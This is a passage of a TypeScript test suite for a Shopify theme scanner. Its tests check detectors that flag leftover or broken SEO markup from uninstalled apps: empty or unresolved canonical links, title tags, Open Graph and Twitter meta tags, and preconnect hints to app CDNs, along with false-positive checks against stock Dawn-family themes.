  it("detects reversed attribute order (href before rel)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link href="" rel="canonical">',
    };
    const findings = detectGhostCanonical(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_CANONICAL);
    expect(findings[0].description).toContain("Empty canonical href");
  });

  // --- False positive avoidance ---

  it("does NOT flag native Shopify canonical_url", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link rel="canonical" href="{{ canonical_url }}">',
    };
    const findings = detectGhostCanonical(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag native canonical_url with filter", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link rel="canonical" href="{{ canonical_url | strip }}">',
    };
    const findings = detectGhostCanonical(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag canonical inside Liquid conditional", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '{% if template == \'product\' %}<link rel="canonical" href="">{%endif%}',
    };
    const findings = detectGhostCanonical(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag canonical inside Liquid comment block", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '{% comment %}<link rel="canonical" href="">{% endcomment %}',
    };
    const findings = detectGhostCanonical(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag single valid hardcoded canonical URL", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link rel="canonical" href="https://mystore.com/">',
    };
    const findings = detectGhostCanonical(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag valid Liquid variables: request.path, shop.url, page_url", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        '<link rel="canonical" href="{{ request.path }}">',
        '<link rel="canonical" href="{{ shop.url }}">',
        '<link rel="canonical" href="{{ page_url }}">',
      ].join("\n"),
    };
    const findings = detectGhostCanonical(file);
    // 3 tags total, but all use safe vars — should only get duplicate findings for lines 2+
    // since the safe vars are not flagged as unresolved.
    // Actually: 3 canonicals means line 2 and 3 are duplicates.
    const unresolvedFindings = findings.filter((f) => f.description.includes("Unresolved"));
    expect(unresolvedFindings).toHaveLength(0);
  });

  it("returns empty for file with no canonical tags", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<head><title>Hello</title></head>",
    };
    const findings = detectGhostCanonical(file);
    expect(findings).toHaveLength(0);
  });

  // --- Severity ---

  it("severity is HIGH by default", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link rel="canonical" href="">',
    };
    const findings = detectGhostCanonical(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe(Severity.HIGH);
  });

  // --- Integration ---

  it("is included in scanThemeFiles results", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: '<link rel="canonical" href="">',
      },
    ];
    const result = scanThemeFiles(files);
    const canonicalFindings = findingsOfType(result.findings, FindingType.GHOST_CANONICAL);
    expect(canonicalFindings).toHaveLength(1);
  });
});

// ---------------------------------------------------------------------------
// detectGhostTitle
// ---------------------------------------------------------------------------

describe("detectGhostTitle", () => {
  // --- Detection cases ---

  it("detects empty title in layout file", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<title></title>",
    };
    const findings = detectGhostTitle(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_TITLE);
    expect(findings[0].description).toContain("Empty title tag");
  });

  it("detects whitespace-only title in layout file", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<title>   </title>",
    };
    const findings = detectGhostTitle(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_TITLE);
    expect(findings[0].description).toContain("Empty title tag");
  });

  it("detects unresolved Liquid variable in title", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<title>{{ seo_title_format }}</title>",
    };
    const findings = detectGhostTitle(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_TITLE);
    expect(findings[0].description).toContain("Unresolved Liquid variable");
  });

  it("detects unresolved variable mixed with valid page_title (HIGH severity — unresolved var is the issue)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<title>{{ page_title }} | {{ seo_suffix }}</title>",
    };
    const findings = detectGhostTitle(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_TITLE);
    expect(findings[0].description).toContain("Unresolved Liquid variable");
    expect(findings[0].severity).toBe(Severity.HIGH);
  });

  it("detects app-attributed title via code context", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: ["<!-- booster-seo title override -->", "<title>{{ page_title }}</title>"].join(
        "\n",
      ),
    };
    const findings = detectGhostTitle(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_TITLE);
    expect(findings[0].appName).toBe("BOOSTER SEO");
    expect(findings[0].description).toContain("App-attributed title");
  });

  it("detects duplicate title tags in same layout file", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: ["<title>{{ page_title }}</title>", "<title>{{ page_title }}</title>"].join("\n"),
    };
    const findings = detectGhostTitle(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_TITLE);
    expect(findings[0].description).toContain("Duplicate title tag");
    expect(findings[0].lineNumber).toBe(2);
  });

  it("detects title with known-app render as app-attributed", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: ["<!-- seo-manager title -->", "<title>My Store</title>"].join("\n"),
    };
    const findings = detectGhostTitle(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_TITLE);
    expect(findings[0].appName).toBe("SEO Manager");
  });

  // --- False positive avoidance ---

  it("does NOT flag native Dawn title with page_title and shop.name", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<title>{{ page_title }} &ndash; {{ shop.name }}</title>",
    };
    const findings = detectGhostTitle(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag title with only safe variables", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content:
        "<title>{{ page_title }}{% unless page_title contains shop.name %} - {{ shop.name }}{% endunless %}</title>",
    };
    const findings = detectGhostTitle(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag title inside a Liquid conditional", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "{% if template == 'product' %}<title></title>{% endif %}",
    };
    const findings = detectGhostTitle(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag title inside a Liquid comment", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "{% comment %}<title></title>{% endcomment %}",
    };
    const findings = detectGhostTitle(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag empty title in a non-layout file", () => {
    const file: ThemeFile = {
      filename: "templates/404.liquid",
      content: "<title></title>",
    };
    const findings = detectGhostTitle(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag title with content_for_header or content_for_* variables", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<title>{{ content_for_header }}</title>",
    };
    const findings = detectGhostTitle(file);
    expect(findings).toHaveLength(0);
  });

  it("returns empty for file with no title tags", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<head><link rel="canonical" href="{{ canonical_url }}"></head>',
    };
    const findings = detectGhostTitle(file);
    expect(findings).toHaveLength(0);
  });

  // --- Severity ---

  it("severity is HIGH by default", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<title></title>",
    };
    const findings = detectGhostTitle(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe(Severity.HIGH);
  });

  // --- Integration ---

  it("is included in scanThemeFiles results", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: "<title></title>",
      },
    ];
    const result = scanThemeFiles(files);
    const titleFindings = findingsOfType(result.findings, FindingType.GHOST_TITLE);
    expect(titleFindings).toHaveLength(1);
  });
});

// ---------------------------------------------------------------------------
// detectGhostTitle: SVG <title> elements and stock gift_card title (gc-j93)
// ---------------------------------------------------------------------------

describe("detectGhostTitle — SVG titles are not document titles", () => {
  it("does NOT flag a block-setting variable in an accessible SVG title", () => {
    const file: ThemeFile = {
      filename: "blocks/icon-list.liquid",
      content: [
        '<ul class="icon-list" {{ block.shopify_attributes }}>',
        '  <li><svg role="img" viewBox="0 0 24 24"><title>{{ block.settings.first_label | escape }}</title><path d="M0 0h24v24H0z"/></svg></li>',
        '  <li><svg role="img" viewBox="0 0 24 24"><title>{{ block.settings.second_label | escape }}</title><path d="M0 0h24v24H0z"/></svg></li>',
        "</ul>",
      ].join("\n"),
    };
    expect(detectGhostTitle(file)).toHaveLength(0);
  });

  it("does NOT flag an unknown variable inside an SVG title in a section", () => {
    const file: ThemeFile = {
      filename: "sections/icons.liquid",
      content: '<svg role="img"><title>{{ icon_label }}</title></svg>',
    };
    expect(detectGhostTitle(file)).toHaveLength(0);
  });

  it("does NOT report duplicate titles for two static SVG titles in one file", () => {
    const file: ThemeFile = {
      filename: "blocks/static-icons.liquid",
      content: [
        '<div class="trust">',
        '  <svg role="img"><title>Free shipping</title></svg>',
        '  <svg role="img"><title>Secure checkout</title></svg>',
        "</div>",
      ].join("\n"),
    };
    expect(detectGhostTitle(file)).toHaveLength(0);
  });

  it("does NOT flag titles in multi-line and nested SVGs", () => {
    const file: ThemeFile = {
      filename: "snippets/icon.liquid",
      content: [
        '<svg\n  role="img"\n  viewBox="0 0 24 24"\n>',
        "  <svg><title>{{ inner_label }}</title></svg>",
        "  <title>{{ outer_label }}</title>",
        "</svg >",
      ].join("\n"),
    };
    expect(detectGhostTitle(file)).toHaveLength(0);
  });

  it("does NOT count an SVG title as the first title of a duplicate pair", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "<head><title>{{ page_title }}</title></head>",
        '<body><svg role="img"><title>Cart</title></svg></body>',
      ].join("\n"),
    };
    expect(detectGhostTitle(file)).toHaveLength(0);
  });

  it("STILL flags an unresolved document title that follows a closed SVG", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: ["<svg><title>Logo</title></svg>", "<title>{{ seoapp_meta_title }}</title>"].join(
        "\n",
      ),
    };
    const findings = detectGhostTitle(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].lineNumber).toBe(2);
    expect(findings[0].description).toContain("Unresolved Liquid variable");
  });

  it("STILL flags duplicate document titles when SVG titles sit between them", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "<title>{{ page_title }}</title>",
        "<svg><title>Logo</title></svg>",
        "<title>{{ page_title }}</title>",
      ].join("\n"),
    };
    const findings = detectGhostTitle(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].lineNumber).toBe(3);
    expect(findings[0].description).toContain("Duplicate title tag — also found on line 1");
  });

  it("STILL flags a title after an unclosed <svg> (malformed markup is not an SVG element)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: ["<svg>", "<title>{{ seoapp_meta_title }}</title>"].join("\n"),
    };
    expect(detectGhostTitle(file)).toHaveLength(1);
  });

  it("does NOT treat a custom <svg-icon> element as an SVG", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<svg-icon><title>{{ seoapp_meta_title }}</title></svg-icon>",
    };
    expect(detectGhostTitle(file)).toHaveLength(1);
  });

  it("does NOT flag block or section settings in a document title", () => {
    const file: ThemeFile = {
      filename: "sections/main-page.liquid",
      content:
        "<title>{{ section.settings.heading | escape }} - {{ block.settings.suffix }}</title>",
    };
    expect(detectGhostTitle(file)).toHaveLength(0);
  });

  it("stays linear on a large file of many SVG titles and unclosed SVG opens", () => {
    const content =
      '<svg role="img"><title>{{ block.settings.x }}</title></svg>\n'.repeat(50_000) +
      "<svg ".repeat(200_000);
    const { result, minMs } = timedMinMsWithResult(() =>
      detectGhostTitle({ filename: "blocks/big.liquid", content }),
    );
    expect(result).toHaveLength(0);
    expect(minMs).toBeLessThan(2000);
  });
});

describe("detectGhostTitle — stock gift_card template (gc-j93)", () => {
  // Verbatim <title> markup from Shopify Horizon and Dawn templates/gift_card.liquid.
  const giftCardHead = [
    "{% layout none %}",
    "<!doctype html>",
    "<html>",
    "  <head>",
    "    {%- assign formatted_balance = gift_card.balance | money_without_trailing_zeros | strip_html -%}",
    "",
    "    <title>{{ 'gift_cards.issued.title' | t: value: formatted_balance, shop: shop.name }}</title>",
    "",
    '    <meta name="description" content="{{ \'gift_cards.issued.subtext\' | t }}">',
    "  </head>",
  ].join("\n");

  it("does NOT flag the stock translated gift card title in templates/", () => {
    expect(
      detectGhostTitle({ filename: "templates/gift_card.liquid", content: giftCardHead }),
    ).toHaveLength(0);
  });

  it("does NOT flag the same title in layout/gift_card.liquid", () => {
    expect(
      detectGhostTitle({ filename: "layout/gift_card.liquid", content: giftCardHead }),
    ).toHaveLength(0);
  });

  it("does NOT flag a double-quoted translation key", () => {
    expect(
      detectGhostTitle({
        filename: "layout/theme.liquid",
        content: '<title>{{ "general.title" | translate }}</title>',
      }),
    ).toHaveLength(0);
  });

  it("STILL flags an unresolved variable piped through t", () => {
    const findings = detectGhostTitle({
      filename: "layout/theme.liquid",
      content: "<title>{{ seoapp_title | t }}</title>",
    });
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain("Unresolved Liquid variable");
  });

  it("STILL flags a string literal with a filter that merely starts with t", () => {
    expect(
      detectGhostTitle({
        filename: "layout/theme.liquid",
        content: "<title>{{ 'x' | toxicapp_title }}</title>",
      }),
    ).toHaveLength(1);
  });
});

// ---------------------------------------------------------------------------
// detectGhostOg
// ---------------------------------------------------------------------------

describe("detectGhostOg", () => {
  // --- Detections (should fire) ---

  it("detects empty og:title content", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<meta property="og:title" content="">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_OG);
    expect(findings[0].description).toContain("og:title");
    expect(findings[0].description).toContain("Empty");
  });

  it("detects empty og:image content and upgrades to HIGH severity", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<meta property="og:image" content="">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_OG);
    expect(findings[0].severity).toBe(Severity.HIGH);
    expect(findings[0].description).toContain("og:image");
  });

  it("detects empty twitter:description content", () => {
    const file: ThemeFile = {
      filename: "sections/header.liquid",
      content: '<meta name="twitter:description" content="">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_OG);
    expect(findings[0].description).toContain("twitter:description");
  });

  it("detects unresolved variable in og:title content", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<meta property="og:title" content="{{ seo_og_title }}">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_OG);
    expect(findings[0].description).toContain("Unresolved");
    expect(findings[0].description).toContain("og:title");
  });

  it("detects unresolved variable in og:image content", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<meta property="og:image" content="{{ app_social_image }}">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain("Unresolved");
    expect(findings[0].description).toContain("og:image");
  });

  it("detects app-attributed OG tag via identifyAppFromCode", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "<!-- avada-seo social tags -->",
        '<meta property="og:title" content="{{ page_title }}">',
      ].join("\n"),
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_OG);
    expect(findings[0].appName).toBe("Avada SEO Suite");
    expect(findings[0].description).toContain("App-attributed");
  });

  it("detects whitespace-only content on og:description", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<meta property="og:description" content="   ">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain("Empty");
    expect(findings[0].description).toContain("og:description");
  });

  // --- False positive avoidance (should NOT fire) ---

  it("does NOT flag native Dawn og:title with page_title", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<meta property="og:title" content="{{ page_title }}">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag native og:image with filter (img_url)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content:
        '<meta property="og:image" content="{{ product.featured_image | img_url: \'1200x630\' }}">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag native twitter:card with static valid content", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<meta name="twitter:card" content="summary_large_image">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag OG tag inside Liquid conditional", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '{% if template == "product" %}<meta property="og:title" content="">{% endif %}',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag OG tag inside Liquid comment", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '{% comment %}\n<meta property="og:title" content="">\n{% endcomment %}',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag low-impact empty property og:locale", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<meta property="og:locale" content="">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(0);
  });

  it("returns empty for file with no OG tags", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<head><title>{{ page_title }}</title></head>",
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag duplicate og:title (handled by DUPLICATE_META)", () => {
    // GHOST_OG should not re-detect duplicates — that's DUPLICATE_META's job.
    // Two identical og:title tags with valid content should not produce GHOST_OG findings.
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        '<meta property="og:title" content="{{ page_title }}">',
        '<meta property="og:title" content="{{ page_title }}">',
      ].join("\n"),
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag static valid og:type content", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<meta property="og:type" content="website">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(0);
  });

  // --- Additional edge cases ---

  it("does NOT flag og:description with strip_html filter", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content:
        '<meta property="og:description" content="{{ page_description | strip_html | truncate: 200 }}">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag empty og:site_name (low-impact property)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<meta property="og:site_name" content="">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag empty twitter:site (low-impact property)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<meta name="twitter:site" content="">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag empty fb:app_id (low-impact property)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<meta property="fb:app_id" content="">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag og:image with collection.image safe variable", () => {
    const file: ThemeFile = {
      filename: "sections/collection.liquid",
      content:
        '<meta property="og:image" content="{{ collection.image | img_url: \'1200x630\' }}">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(0);
  });

  it("detects multiple broken OG tags in same file", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        '<meta property="og:title" content="">',
        '<meta property="og:description" content="">',
        '<meta property="og:image" content="">',
      ].join("\n"),
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(3);
  });

  // --- Severity ---

  it("severity is MEDIUM by default for non-og:image", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<meta property="og:title" content="">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe(Severity.MEDIUM);
  });

  it("severity is HIGH for empty og:image", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<meta property="og:image" content="">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe(Severity.HIGH);
  });

  // --- Integration ---

  it("is included in scanThemeFiles results", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: '<meta property="og:title" content="">',
      },
    ];
    const result = scanThemeFiles(files);
    const ogFindings = findingsOfType(result.findings, FindingType.GHOST_OG);
    expect(ogFindings).toHaveLength(1);
  });
});

// ---------------------------------------------------------------------------
// Golden-file regression: stock Shopify free reference themes (LOG-1 / GC-s47)
//
// Legitimate Dawn-family theme markup must produce ZERO GHOST_TITLE / GHOST_OG
// findings. Each theme is asserted by name so a future regression points at the
// exact theme whose head markup broke. These tests guard the safe-variable
// allowlists against silently narrowing.
// ---------------------------------------------------------------------------

describe("reference-theme golden files — no GHOST_TITLE/GHOST_OG false positives", () => {
  for (const theme of REFERENCE_THEMES) {
    it(`does NOT flag ${theme.name} <title> markup`, () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: theme.title,
      };
      expect(detectGhostTitle(file)).toHaveLength(0);
    });

    it(`does NOT flag ${theme.name} meta-tags.liquid OG/Twitter markup`, () => {
      const file: ThemeFile = {
        filename: "snippets/meta-tags.liquid",
        content: theme.metaTags,
      };
      expect(detectGhostOg(file)).toHaveLength(0);
    });

    it(`does NOT flag ${theme.name} full head via scanThemeFiles`, () => {
      const files: ThemeFile[] = [
        {
          filename: "layout/theme.liquid",
          content: `<head>\n${theme.title}\n</head>`,
        },
        { filename: "snippets/meta-tags.liquid", content: theme.metaTags },
      ];
      const { findings } = scanThemeFiles(files);
      expect(findingsOfType(findings, FindingType.GHOST_TITLE)).toHaveLength(0);
      expect(findingsOfType(findings, FindingType.GHOST_OG)).toHaveLength(0);
    });
  }

  // Spot-check the specific variables/filters that previously false-positived,
  // so a narrowing of any one allowlist entry fails loudly and specifically.
  it("does NOT flag Dawn local og_* assigns (og_title/og_url/og_type/og_description)", () => {
    const file: ThemeFile = {
      filename: "snippets/meta-tags.liquid",
      content: [
        '<meta property="og:url" content="{{ og_url }}">',
        '<meta property="og:title" content="{{ og_title | escape }}">',
        '<meta property="og:type" content="{{ og_type }}">',
        '<meta property="og:description" content="{{ og_description | escape }}">',
      ].join("\n"),
    };
    expect(detectGhostOg(file)).toHaveLength(0);
  });

  it("does NOT flag page_image / page_image.width / page_image.height", () => {
    const file: ThemeFile = {
      filename: "snippets/meta-tags.liquid",
      content: [
        '<meta property="og:image" content="http:{{ page_image | image_url }}">',
        '<meta property="og:image:width" content="{{ page_image.width }}">',
        '<meta property="og:image:height" content="{{ page_image.height }}">',
      ].join("\n"),
    };
    expect(detectGhostOg(file)).toHaveLength(0);
  });

  it("does NOT flag request.* / settings.* / cart.* native objects", () => {
    const file: ThemeFile = {
      filename: "snippets/meta-tags.liquid",
      content: [
        '<meta property="og:url" content="{{ request.origin }}">',
        '<meta property="og:price:currency" content="{{ cart.currency.iso_code }}">',
        '<meta name="twitter:site" content="{{ settings.social_twitter_link | split: \'/\' | last }}">',
      ].join("\n"),
    };
    expect(detectGhostOg(file)).toHaveLength(0);
  });

  it("does NOT flag the | t (translate) or | default filters on otherwise-unknown vars", () => {
    const file: ThemeFile = {
      filename: "snippets/meta-tags.liquid",
      content: [
        '<meta property="og:title" content="{{ \'general.meta.title\' | t }}">',
        '<meta property="og:description" content="{{ meta_blurb | default: shop.name }}">',
      ].join("\n"),
    };
    expect(detectGhostOg(file)).toHaveLength(0);
  });

  it("does NOT flag Dawn <title> current_tags / current_page pagination vars", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: DAWN_TITLE,
    };
    expect(detectGhostTitle(file)).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// v1.3 / v1.4 detectors (gc-06e.3): the same real-stock-theme golden-file guard
// applied to detectGhostCanonical / detectGhostPreconnect / detectGhostFont /
// detectGhostAjax. These detectors had ZERO coverage against real Dawn markup,
// the exact LOG-1 class of bug that shipped false positives. A failure here is a
// REAL false positive on legitimate stock-theme code, not a test to weaken.
// ---------------------------------------------------------------------------

describe("reference-theme golden files (v1.3/v1.4): no false positives on canonical/preconnect/font/ajax", () => {
  for (const theme of REFERENCE_THEMES) {
    it(`does NOT flag ${theme.name} canonical link markup`, () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: theme.canonical,
      };
      expect(detectGhostCanonical(file)).toHaveLength(0);
    });

    it(`does NOT flag ${theme.name} preconnect hint markup`, () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: theme.preconnect,
      };
      expect(detectGhostPreconnect(file)).toHaveLength(0);
    });

    it(`does NOT flag ${theme.name} font preload + font_face markup`, () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: theme.fontFace,
      };
      expect(detectGhostFont(file)).toHaveLength(0);
    });

    it(`does NOT flag ${theme.name} relative route-variable fetch call sites`, () => {
      const file: ThemeFile = {
        filename: "assets/global.js",
        content: theme.ajax,
      };
      expect(detectGhostAjax(file)).toHaveLength(0);
    });

    it(`does NOT flag ${theme.name} full liquid head via scanThemeFiles`, () => {
      const files: ThemeFile[] = [
        {
          filename: "layout/theme.liquid",
          content: `<head>\n${theme.canonical}\n${theme.preconnect}\n${theme.fontFace}\n</head>`,
        },
      ];
      const { findings } = scanThemeFiles(files);
      expect(findingsOfType(findings, FindingType.GHOST_CANONICAL)).toHaveLength(0);
      expect(findingsOfType(findings, FindingType.GHOST_PRECONNECT)).toHaveLength(0);
      expect(findingsOfType(findings, FindingType.GHOST_FONT)).toHaveLength(0);
    });
  }
});

// ---------------------------------------------------------------------------
// Anti-over-correction: the expanded allowlists must NOT blind the detector to
// genuine ghost code. Truly orphaned / app-injected markup is STILL flagged.
// ---------------------------------------------------------------------------

describe("allowlist expansion still catches real GHOST_TITLE/GHOST_OG findings", () => {
  it("STILL flags an empty title in a layout file", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<head>\n<title></title>\n</head>",
    };
    const findings = detectGhostTitle(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_TITLE);
    expect(findings[0].description).toContain("Empty title tag");
  });

  it("STILL flags a broken app-attributed unresolved title variable", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<title>{{ seoapp_meta_title }}</title>",
    };
    const findings = detectGhostTitle(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_TITLE);
    expect(findings[0].description).toContain("Unresolved Liquid variable");
  });

  it("STILL flags an orphaned unresolved OG variable from an uninstalled app", () => {
    const file: ThemeFile = {
      filename: "snippets/meta-tags.liquid",
      content: '<meta property="og:title" content="{{ seoapp_meta_title }}">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_OG);
    expect(findings[0].description).toContain("Unresolved");
  });

  it("STILL flags an empty high-value OG image left behind by an app", () => {
    const file: ThemeFile = {
      filename: "snippets/meta-tags.liquid",
      content: '<meta property="og:image" content="">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_OG);
    expect(findings[0].severity).toBe(Severity.HIGH);
  });

  it("STILL flags an unknown var even when a known-safe var is also present", () => {
    const file: ThemeFile = {
      filename: "snippets/meta-tags.liquid",
      content: '<meta property="og:title" content="{{ page_title }} {{ seoapp_suffix }}">',
    };
    const findings = detectGhostOg(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain("Unresolved");
  });
});

// ---------------------------------------------------------------------------
// detectGhostPreconnect
// ---------------------------------------------------------------------------

describe("detectGhostPreconnect", () => {
  // --- Detections (should fire) ---

  it("detects preconnect to known app CDN", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link rel="preconnect" href="https://cdn.judge.me">',
    };
    const findings = detectGhostPreconnect(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_PRECONNECT);
    expect(findings[0].severity).toBe(Severity.MEDIUM);
    expect(findings[0].appName).toBe("Judge.me");
    expect(findings[0].lineNumber).toBe(1);
    expect(findings[0].filename).toBe("layout/theme.liquid");
    expect(findings[0].description).toContain("preconnect");
    expect(findings[0].description).toContain("cdn.judge.me");
  });

  it("detects dns-prefetch to known app CDN", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link rel="dns-prefetch" href="//cdn.loox.io">',
    };
    const findings = detectGhostPreconnect(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_PRECONNECT);
    expect(findings[0].appName).toBe("Loox");
    expect(findings[0].description).toContain("dns-prefetch");
  });

  it("detects preload to known app CDN", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
